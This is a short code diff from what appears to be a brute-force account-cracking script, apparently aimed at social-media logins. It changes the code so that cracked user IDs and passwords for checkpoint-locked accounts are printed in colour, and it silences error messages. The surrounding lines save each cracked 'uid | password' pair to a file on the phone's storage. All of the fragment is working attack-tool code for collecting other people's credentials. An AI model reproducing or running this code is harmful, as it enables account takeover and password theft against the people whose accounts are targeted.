@@ -1994,7 +1994,7 @@ def d(uid,pwx,tl):
                     break
             elif 'checkpoint' in response:
                 uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
@@ -2004,7 +2004,7 @@ def d(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 
 def cracker(uid, pwx, tl):
